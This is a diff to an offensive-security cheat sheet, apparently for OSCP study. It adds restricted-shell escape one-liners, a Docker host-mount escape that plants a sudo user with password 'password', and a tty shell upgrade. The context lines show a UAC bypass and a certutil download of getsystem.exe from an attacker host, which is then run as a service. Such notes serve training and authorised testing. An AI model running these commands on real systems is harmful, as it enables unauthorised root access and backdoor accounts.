@@ -247,10 +247,24 @@ TODO
 
 ### 1.12 Escaping Restricted Bash ###
 
-**Objective:** Identify the current restricted bash software and find techniques to circumvent and obtain fully-functional shell.
+**Objective:** Obtain a fully functional shell from a restricted shell (e.g. rbash / rksh / rzsh / lshell etc.)
 
 ```sh
-TODO
+# This is a list of possibilities, refer to specific shell for escape options
+awk 'BEGIN {system("/bin/sh")}'
+BASH_CMDS[a]=/bin/sh;a
+echo os.system("/bin/bash");
+ed                                  # !'/bin/sh'
+expect                              # Use "spawn sh" first, then "sh" after
+find / -name test -exec /bin/sh \;
+irb                                 # Interactive ruby - exec '/bin/sh'
+more                                # (works for less / man etc. [pager commands]) - !'sh'
+mutt                                # click on "!" --> /bin/sh
+nmap --interactive
+perl -e 'system("sh -i");'
+php -a                              # Interactive PHP - exec("sh -i");
+vi                                  # (or vim) - Run in command mode --- :!/bin/sh
+
 ```
 
 ## 2 Local Privilege Escalation (LPE) ##
@@ -343,6 +357,20 @@ find /sbin/ -perm 4000                                  # SUID set in /sbin
 # Other special things
 w                       # Other users logged onto the system
 cat /etc/motd           # Message of the day, possibly triggered on login
+```
+
+Docker exploit (if we are in a docker container)
+```sh
+# Mount new volume '/' as '/mnt' in shell mode with alpine image, chrooted to '/mnt' with "sh" as shell
+/docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# As root in container (not machine!), we add a new user (user / password):
+useradd user
+passwd user # set to "password"
+usermod -aG sudo user # Add "user" to "sudo" group
+
+# In a separate session, SSH as sudo user
+ssh user@<TARGET IP> # password = "password"
+sudo su
 ```
 
 Nmap exploit (if sudo -l allows for nmap)
@@ -536,7 +564,7 @@ User Account Control (UAC) Bypass (Administrator User with Medium-Priv Shell)
 ```bat
 REM Check for Non-Strict Settings 
 REM - EnableLUA    REG_DWORD    0x1 (0 = No Bypass, 1 = UAC Active)
-REM - ConsentPromptBehaviorAdmin=2 and PromptOnSecureDesktop=1 --> DIFFICULT
+REM - ConsentPromptBehaviorAdmin=2 and PromptOnSecureDesktop=1 -- DIFFICULT
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
 
 REM If Ok, we use EventVwr for a bypass https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
@@ -578,8 +606,6 @@ certutil -urlcache -split -f http://<IP>:<PORT>/getsystem.exe C:\getsystem.exe
 sc create myservice binpath= "C:\getsystem.exe" type= own type= interact
 sc start myservice
 ```
-
-
 
 ### 2.3 Cross-Compilation of C/C++ Files on Kali Linux ###
 
@@ -789,6 +815,20 @@ steghide info <IMAGE FILE>          # Look for embedded text / file-content
 stehide extract -sf <IMAGE FILE>    # Extract text / file-content
 ```
 
+### 3.6 Improving / Upgrading system shell ###
+
+Improving system shell by getting tty:
+```sh
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+Complete interactive system shell procedure
+1. Obtain tty [Target shell]
+2. Type "Ctrl+Z" to return back to Attacker shell
+3. Type "stty raw -echo" [Attacker Shell]
+4. Type "fg" to return back to Target Shell
+5. Press "Enter"
+6. Start running commands (will be a bit less responsive)
+
 ## 4 Buffer Overflow Attack ##
 
 In the context of OSCP PWK-2020, the focus appears to be on using [Immunity Debugger](https://www.immunityinc.com/products/debugger/) on Windows PE32 (x86) binaries (henceforth termed EXE) as opposed to others (e.g. gdb on ELF). This section seek to streamline and simplify that process.
@@ -805,7 +845,7 @@ A buffer overflow attack tends to follow a standard methodology.
 
 The following is a sample python template, with appropriate commands to send the payload to an external listening server / as argument to the EXE:
 ```py
-import socket
+import socket, os
 
 # (1) Calculation of EIP offset
 # Create MSF pattern (e.g. length10000): !mona pattern_create 10000
